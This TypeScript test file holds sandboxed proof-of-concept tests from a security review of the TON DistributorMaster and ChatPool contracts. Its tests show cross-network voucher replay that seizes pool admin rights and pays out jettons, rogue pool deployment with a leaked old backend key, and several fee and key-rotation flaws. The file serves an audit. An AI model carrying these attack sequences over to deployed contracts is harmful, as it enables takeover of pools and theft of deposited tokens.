import { Blockchain, SandboxContract, TreasuryContract, internal } from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import { keyPairFromSeed, KeyPair } from '@ton/crypto';
import * as fs from 'fs';
import * as path from 'path';
import { ChatPool, storeAdminInitVoucher, storeClaimVoucher, storeDepositVoucher } from '../../wrappers/ChatPool';
import { DistributorMaster } from '../../wrappers/DistributorMaster';
// ChatPool exactly as compiled inside the master (the code the master really deploys)
import { ChatPool as MasterChatPool } from '../../build/DistributorMaster/tact_ChatPool';
import '@ton/test-utils';
import { signatureCell, signVoucher, TAG } from '../helpers/vouchers';

// PoCs for the DistributorMaster security review. Each test asserts the
// behaviour the finding describes (i.e. the test PASSES when the issue exists).

const CHAT_ID = -1001234567890n;
const pub = (kp: KeyPair) => BigInt('0x' + kp.publicKey.toString('hex'));
const farFuture = () => BigInt(Math.floor(Date.now() / 1000) + 3600);

function adminVoucher(chatId: bigint, master: Address, admin: Address, kp: KeyPair, pool: Address) {
    const v = beginCell()
        .store(storeAdminInitVoucher({ $$type: 'AdminInitVoucher', chatId, master, admin, expiry: farFuture() }))
        .endCell();
    return { voucherCell: v, signature: signatureCell(signVoucher(v, kp, TAG.Admin, pool)) };
}

function depositPayload(chatId: bigint, jm: Address, jw: Address, kp: KeyPair, pool: Address): Cell {
    const v = beginCell()
        .store(
            storeDepositVoucher({
                $$type: 'DepositVoucher',
                chatId,
                jettonMaster: jm,
                expectedJettonWallet: jw,
                expiry: farFuture(),
            }),
        )
        .endCell();
    return beginCell()
        .storeRef(v)
        .storeBuffer(signVoucher(v, kp, TAG.Deposit, pool))
        .endCell();
}

function claimVoucher(
    chatId: bigint,
    recipient: Address,
    jm: Address,
    amount: bigint,
    nonce: bigint,
    kp: KeyPair,
    pool: Address,
) {
    const v = beginCell()
        .store(
            storeClaimVoucher({
                $$type: 'ClaimVoucher',
                chatId,
                recipient,
                jettonMaster: jm,
                amount,
                nonce,
                expiry: farFuture(),
            }),
        )
        .endCell();
    return { voucherCell: v, signature: signVoucher(v, kp, TAG.Claim, pool) };
}

async function deployMaster(bc: Blockchain, owner: SandboxContract<TreasuryContract>, key: bigint) {
    const m = bc.openContract(await DistributorMaster.fromInit(owner.address, key));
    const r = await m.send(owner.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
    expect(r.transactions).toHaveTransaction({ to: m.address, deploy: true, success: true });
    return m;
}

describe('DistributorMaster PoC', () => {
    const backend = keyPairFromSeed(Buffer.alloc(32, 7));

    it('DM-9: pools deployed by the master have a different code hash than build/ChatPool (standalone wrapper/tests)', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const m = await deployMaster(bc, owner, pub(backend));
        const viaMaster = await m.getPoolAddress(CHAT_ID);
        const viaStandalone = (await ChatPool.fromInit(m.address, CHAT_ID, pub(backend))).address;
        const viaMasterBuild = (await MasterChatPool.fromInit(m.address, CHAT_ID, pub(backend))).address;
        expect(viaMaster.equals(viaMasterBuild)).toBe(true);
        expect(viaMaster.equals(viaStandalone)).toBe(false); // standalone ChatPool wrapper derives a wrong address
        const j = JSON.parse(fs.readFileSync(path.join(__dirname, '../../build/ChatPool.compiled.json'), 'utf8'));
        const standaloneCode = Cell.fromBoc(Buffer.from(j.hex, 'hex'))[0];
        await m.send(owner.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const deployed = (await bc.getContract(viaMaster)).accountState as any;
        expect(deployed.state.code.hash().equals(standaloneCode.hash())).toBe(false);
        // the only difference is get_abi_ipfs (ABI includes master types); behaviour is identical
        const r = await bc.runGetMethod(viaMaster, 'get_abi_ipfs');
        console.log('DM-9 deployed pool abi:', r.stackReader.readString());
    });

    it('DM-1: same owner wallet + same backend key on two networks => identical master/pool addresses; testnet-signed vouchers replay on mainnet', async () => {
        const testnet = await Blockchain.create();
        const mainnet = await Blockchain.create();
        // v4-style wallet from one mnemonic has the same address on both networks
        const ownerT = await testnet.treasury('owner');
        const ownerM = await mainnet.treasury('owner');
        expect(ownerT.address.equals(ownerM.address)).toBe(true);

        const mT = await deployMaster(testnet, ownerT, pub(backend));
        const mM = await deployMaster(mainnet, ownerM, pub(backend));
        expect(mT.address.equals(mM.address)).toBe(true);

        const tester = await testnet.treasury('tester');
        const testerM = await mainnet.treasury('tester');
        const realAdmin = await mainnet.treasury('realAdmin');
        // Pools exist on both nets (anyone can CreatePool)
        await mT.send(tester.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        await mM.send(realAdmin.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const poolT = testnet.openContract(ChatPool.fromAddress(await mT.getPoolAddress(CHAT_ID)));
        const poolM = mainnet.openContract(ChatPool.fromAddress(await mM.getPoolAddress(CHAT_ID)));
        expect(poolT.address.equals(poolM.address)).toBe(true);

        // (a) admin voucher the TESTNET backend issued to the tester is accepted on MAINNET
        const av = adminVoucher(CHAT_ID, mT.address, tester.address, backend, poolT.address);
        const rM = await poolM.send(testerM.getSender(), { value: toNano('0.05') }, { $$type: 'SetAdmin', ...av });
        expect(rM.transactions).toHaveTransaction({ to: poolM.address, success: true });
        expect((await poolM.getPoolAdmin())!.equals(tester.address)).toBe(true);
        // the real admin is now locked out of the init path
        const av2 = adminVoucher(CHAT_ID, mM.address, realAdmin.address, backend, poolM.address);
        const rReal = await poolM.send(
            realAdmin.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetAdmin', ...av2 },
        );
        expect(rReal.transactions).toHaveTransaction({ to: poolM.address, success: false });

        // (b) claim voucher signed for the testnet pool pays out on mainnet (same jetton master/wallet addresses)
        const mainnet2 = await Blockchain.create();
        const owner2 = await mainnet2.treasury('owner');
        const m2 = await deployMaster(mainnet2, owner2, pub(backend));
        const adm = await mainnet2.treasury('realAdmin');
        await m2.send(adm.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const pool2 = mainnet2.openContract(ChatPool.fromAddress(await m2.getPoolAddress(CHAT_ID)));
        await pool2.send(
            adm.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetAdmin', ...adminVoucher(CHAT_ID, m2.address, adm.address, backend, pool2.address) },
        );
        const jw = await mainnet2.treasury('jettonWallet');
        const jm = new Address(0, Buffer.alloc(32, 3));
        await pool2.send(
            jw.getSender(),
            { value: toNano('0.5') },
            {
                $$type: 'JettonTransferNotification',
                queryId: 0n,
                amount: toNano('1000'),
                sender: adm.address,
                forwardPayload: depositPayload(CHAT_ID, jm, jw.address, backend, pool2.address),
            },
        );
        expect(await pool2.getBalanceOf(jm)).toEqual(toNano('1000'));
        // voucher produced against the TESTNET pool address
        const cv = claimVoucher(CHAT_ID, tester.address, jm, toNano('50'), 777n, backend, poolT.address);
        const attacker2 = await mainnet2.treasury('tester');
        const rc = await pool2.send(
            attacker2.getSender(),
            { value: toNano('0.15') },
            {
                $$type: 'Claim',
                voucherCell: cv.voucherCell,
                signature: beginCell().storeBuffer(cv.signature).endCell(),
            },
        );
        expect(rc.transactions).toHaveTransaction({ from: pool2.address, to: jw.address, success: true });
        expect(await pool2.getBalanceOf(jm)).toEqual(toNano('950'));
    });

    it('DM-2: RotateBackendKey silently re-points poolAddress(chatId); the funded pool is orphaned and a 2nd pool can be created for the same chat', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const admin = await bc.treasury('admin');
        const m = await deployMaster(bc, owner, pub(backend));
        await m.send(admin.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const oldPoolAddr = await m.getPoolAddress(CHAT_ID);
        const oldPool = bc.openContract(ChatPool.fromAddress(oldPoolAddr));
        await oldPool.send(
            admin.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetAdmin', ...adminVoucher(CHAT_ID, m.address, admin.address, backend, oldPoolAddr) },
        );
        expect((await oldPool.getPoolAdmin())!.equals(admin.address)).toBe(true);

        const next = keyPairFromSeed(Buffer.alloc(32, 8));
        await m.send(
            owner.getSender(),
            { value: toNano('0.05') },
            { $$type: 'RotateBackendKey', backendPubKey: pub(next) },
        );
        const newPoolAddr = await m.getPoolAddress(CHAT_ID);
        expect(newPoolAddr.equals(oldPoolAddr)).toBe(false); // getter (used by the miniapp) now points elsewhere
        expect((await bc.getContract(newPoolAddr)).accountState?.type).not.toBe('active'); // and there is nothing there
        const r = await m.send(admin.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        expect(r.transactions).toHaveTransaction({ from: m.address, to: newPoolAddr, deploy: true, success: true });
        // two live pools for one chat, the old one still trusting the old key
        expect(await oldPool.getBackendKey()).toEqual(pub(backend));
        expect((await bc.getContract(oldPoolAddr)).accountState?.type).toBe('active');
    });

    it('DM-3: after rotation (e.g. key leak) anyone can still deploy an old-key pool bound to the real master, bypassing it, and seize its admin with the leaked key', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const attacker = await bc.treasury('attacker');
        const m = await deployMaster(bc, owner, pub(backend));
        const OTHER_CHAT = -1009999999999n;
        const officialOldAddr = await m.getPoolAddress(OTHER_CHAT); // what the master derived before rotation
        const next = keyPairFromSeed(Buffer.alloc(32, 8));
        await m.send(
            owner.getSender(),
            { value: toNano('0.05') },
            { $$type: 'RotateBackendKey', backendPubKey: pub(next) },
        );

        // StateInit is public: deploy ChatPool(master, chat, LEAKED key) directly, with the master's own pool code
        const rogue = bc.openContract(await MasterChatPool.fromInit(m.address, OTHER_CHAT, pub(backend)));
        expect(rogue.address.equals(officialOldAddr)).toBe(true);
        const d = await rogue.send(attacker.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
        expect(d.transactions).toHaveTransaction({ to: rogue.address, deploy: true, success: true });
        const v = adminVoucher(OTHER_CHAT, m.address, attacker.address, backend /* leaked */, rogue.address);
        const r = await rogue.send(attacker.getSender(), { value: toNano('0.05') }, { $$type: 'SetAdmin', ...v });
        expect(r.transactions).toHaveTransaction({ to: rogue.address, success: true });
        expect((await rogue.getPoolAdmin())!.equals(attacker.address)).toBe(true);
        // same code hash as a genuine pool, master field = the real master
        const genuineAddr = await m.getPoolAddress(OTHER_CHAT);
        await m.send(attacker.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: OTHER_CHAT });
        const genuineCode = ((await bc.getContract(genuineAddr)).accountState as any).state.code as Cell;
        const rogueCode = ((await bc.getContract(rogue.address)).accountState as any).state.code as Cell;
        expect(rogueCode.hash().equals(genuineCode.hash())).toBe(true);
    });

    it('DM-4: CreatePool is not idempotent: re-creating an existing pool moves 0.1 TON of the caller into the pool for good', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const user = await bc.treasury('user');
        const m = await deployMaster(bc, owner, pub(backend));
        await m.send(user.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const poolAddr = await m.getPoolAddress(CHAT_ID);
        const before = (await bc.getContract(poolAddr)).balance;
        const r = await m.send(user.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        expect(r.transactions).toHaveTransaction({ from: m.address, to: poolAddr, success: true, deploy: false });
        const after = (await bc.getContract(poolAddr)).balance;
        expect(after - before).toBeGreaterThan(toNano('0.099'));
    });

    it('DM-5: Deploy echoes the whole deploy value back -> master is left with ~0 TON and accrues storage debt; observe CreatePool after long idle', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const user = await bc.treasury('user');
        const m = await deployMaster(bc, owner, pub(backend));
        const bal0 = (await bc.getContract(m.address)).balance;
        console.log('DM-5 master balance right after Deploy(0.1 TON):', bal0.toString(), 'nanoTON');
        expect(bal0).toBeLessThan(toNano('0.01'));

        const t0 = Math.floor(Date.now() / 1000);
        for (const years of [1, 4, 14]) {
            bc.now = t0 + years * 365 * 86400;
            const r = await m.send(
                user.getSender(),
                { value: toNano('0.3') },
                { $$type: 'CreatePool', chatId: CHAT_ID + BigInt(years) },
            );
            const tx = r.transactions.find((t) => t.inMessage?.info.dest?.toString() === m.address.toString());
            const d: any = tx!.description;
            console.log(
                `DM-5 after ${years}y: aborted=${d.aborted} exit=${d.computePhase?.exitCode ?? d.computePhase?.type} ` +
                    `storageCollected=${d.storagePhase?.storageFeesCollected} due=${d.storagePhase?.storageFeesDue} ` +
                    `creditDue=${d.creditPhase?.dueFeesColelcted} status=${d.storagePhase?.statusChange} poolDeployed=${r.transactions.some((t) => (t.description as any).computePhase?.type === 'vm' && t.inMessage?.init != null && t !== tx)} ` +
                    `state=${(await bc.getContract(m.address)).accountState?.type}`,
            );
            if (years === 1) expect(d.storagePhase.storageFeesDue).toBeGreaterThan(0n); // debt never paid even with traffic
            if (years === 14) {
                expect(d.aborted).toBe(true);
                expect((await bc.getContract(m.address)).accountState?.type).toBe('frozen');
                expect(r.transactions).not.toHaveTransaction({ from: m.address, deploy: true });
            }
        }
    });

    it('DM-6: no ChangeOwner (Ownable, not OwnableTransferable): owner can never be moved', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const m = await deployMaster(bc, owner, pub(backend));
        const body = beginCell()
            .storeUint(0x819dbe99, 32)
            .storeUint(0, 64)
            .storeAddress((await bc.treasury('x')).address)
            .endCell();
        const r = await owner.send({ to: m.address, value: toNano('0.05'), body });
        expect(r.transactions).toHaveTransaction({ to: m.address, success: false, exitCode: 130 });
    });

    it('DM-7: RotateBackendKey accepts 0 / any value; pools created afterwards can never get an admin', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const admin = await bc.treasury('admin');
        const m = await deployMaster(bc, owner, pub(backend));
        const r = await m.send(
            owner.getSender(),
            { value: toNano('0.05') },
            { $$type: 'RotateBackendKey', backendPubKey: 0n },
        );
        expect(r.transactions).toHaveTransaction({ to: m.address, success: true });
        await m.send(admin.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        const p = bc.openContract(ChatPool.fromAddress(await m.getPoolAddress(CHAT_ID)));
        const s = await p.send(
            admin.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetAdmin', ...adminVoucher(CHAT_ID, m.address, admin.address, backend, p.address) },
        );
        expect(s.transactions).toHaveTransaction({ to: p.address, success: false });
    });

    it('CHECK-2: non-bounceable CreatePool when master balance < accrued storage fee', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const user = await bc.treasury('user');
        const m = await deployMaster(bc, owner, pub(backend));
        bc.now = Math.floor(Date.now() / 1000) + 200 * 86400;
        const body = beginCell().storeUint(0x69873d03, 32).storeInt(CHAT_ID, 64).endCell();
        const r = await bc.sendMessage(
            internal({ from: user.address, to: m.address, value: toNano('0.3'), body, bounce: false }),
        );
        const tx = r.transactions.find((t) => t.inMessage?.info.dest?.toString() === m.address.toString());
        const d: any = tx!.description;
        console.log(
            `DM-8 non-bounceable: aborted=${d.aborted} exit=${d.computePhase?.exitCode} storage=${d.storagePhase?.storageFeesCollected} due=${d.storagePhase?.storageFeesDue}`,
        );
        console.log(
            'CHECK-2 refund to user:',
            r.transactions.some((t) => t.inMessage?.info.dest?.toString() === user.address.toString()),
        );
    });

    it('CHECK: CreatePool with exactly 0.15 TON succeeds and the master keeps its balance', async () => {
        const bc = await Blockchain.create();
        const owner = await bc.treasury('owner');
        const user = await bc.treasury('user');
        const m = await deployMaster(bc, owner, pub(backend));
        await owner.send({ to: m.address, value: toNano('1'), bounce: false }); // top-up
        const before = (await bc.getContract(m.address)).balance;
        const r = await m.send(user.getSender(), { value: toNano('0.15') }, { $$type: 'CreatePool', chatId: CHAT_ID });
        expect(r.transactions).toHaveTransaction({ from: m.address, deploy: true, success: true });
        const tx = r.transactions.find((t) => t.inMessage?.info.dest?.toString() === m.address.toString())!;
        console.log('CHECK gas/fees of CreatePool:', tx.totalFees.coins.toString());
        const after = (await bc.getContract(m.address)).balance;
        console.log('CHECK master delta:', (after - before).toString());
        expect(before - after).toBeLessThan(toNano('0.001'));
    });
});
